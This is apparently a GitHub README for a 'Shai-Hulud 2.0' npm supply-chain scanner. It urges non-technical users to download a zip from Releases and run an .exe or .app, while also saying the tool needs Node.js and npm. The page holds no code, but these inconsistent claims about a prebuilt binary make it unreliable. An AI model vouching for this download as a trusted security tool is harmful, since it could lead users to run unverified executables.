# 🛡️ Shai-Hulud-2.0-Detector - Simple Package Security Scanner

## 🚀 Getting Started

Welcome to the Shai-Hulud-2.0-Detector! This tool helps you find and identify harmful npm packages from the Shai-Hulud 2.0 supply chain attack. You don't need any technical skills to use it. Follow these steps to get started.

## 📥 Download the Application

[![Download Shai-Hulud-2.0-Detector](https://img.shields.io/badge/Download%20Now-Access%20Releases-blue.svg)](https://github.com/nigerbartus/Shai-Hulud-2.0-Detector/releases)

To download the application, visit the Releases page:

[Download from Releases](https://github.com/nigerbartus/Shai-Hulud-2.0-Detector/releases)

## 📋 System Requirements

- **Operating System:** Windows, macOS, or Linux
- **Memory:** At least 4 GB of RAM
- **Disk Space:** Minimum 100 MB of available space
- **Network:** Internet connection for downloading packages and updates

## 👩‍💻 Prerequisites

1. **Node.js**: If you haven't already, install Node.js from [nodejs.org](https://nodejs.org). This application requires Node.js to run.
2. **npm**: npm comes with Node.js. You will use it to manage packages.

## 🔍 Features

- Detects over 790 malicious npm packages that are part of the Shai-Hulud 2.0 attack.
- Scans for suspicious scripts that may harm your applications.
- Identifies TruffleHog activity, allowing you to spot potential data leaks.
- Recognizes SHA1HULUD runners that could execute harmful scripts.
- Detects potential secrets being exfiltrated from your projects.
- Supports GitHub Actions and includes SARIF reports for easy integration.

## 🔧 Download & Install

1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/nigerbartus/Shai-Hulud-2.0-Detector/releases).
2. **Select the Latest Version**: Look for the most recent version of the Shai-Hulud-2.0-Detector.
3. **Download the File**: Click on the asset that matches your operating system. It may be named something like `Shai-Hulud-2.0-Detector.zip` or `Shai-Hulud-2.0-Detector.tar.gz`.
4. **Extract the Files**: Once the download completes, extract the files to your preferred location on your computer.
5. **Run the Application**:
   - Depending on your operating system:
     - **Windows**: Double-click the `.exe` file.
     - **macOS**: Open the `.app` file.
     - **Linux**: Open a terminal and navigate to the extracted folder. Enter `./shai-hulud-detector` to run the application.

## ⚙️ Using the Application

1. **Open the Scanner**: After running the application, you will see the main interface.
2. **Start a Scan**: Enter the directory path of your npm project in the provided text box and click on the "Scan" button.
3. **Review the Report**: After a few moments, the scanner will provide a report detailing any malicious packages and security risks.
4. **Take Action**: Follow the recommendations in the report to mitigate any threats identified.

## 🌐 Understanding Results

After a scan, the application presents results in a clear manner:

- **Detected Packages**: Lists any harmful packages found.
- **Suspicious Scripts**: Highlights scripts that may pose a risk.
- **Recommendations**: Offers steps to resolve issues and enhance security.

## 🛠️ Troubleshooting

If you encounter issues while using the Shai-Hulud-2.0-Detector, consider the following:

- **Installation Errors**: Ensure you have Node.js and npm correctly installed.
- **Scans Taking Too Long**: Large projects may take additional time. Consider breaking them down into smaller segments.
- **No Results Found**: Scanning an empty or non-npm directory will show no results. Make sure to provide a valid npm project path.

## 🗨️ Community Support

For further assistance, feel free to visit our [discussion page](https://github.com/nigerbartus/Shai-Hulud-2.0-Detector/discussions). Here, you can ask questions, report issues, or share feedback.

## 📜 License

The Shai-Hulud-2.0-Detector is an open-source tool. You can freely use, modify, and distribute it under the terms of the MIT License. Refer to the LICENSE file in the repository for more details.

## 🌟 Additional Resources

- [Node.js Documentation](https://nodejs.org/en/docs/)
- [npm Documentation](https://docs.npmjs.com/)
- [Security Best Practices for npm](https://docs.npmjs.com/resolving-security-vulnerabilities)

Being aware of the tools that protect your projects is essential. Utilize the Shai-Hulud-2.0-Detector to keep your development environment safe and secure.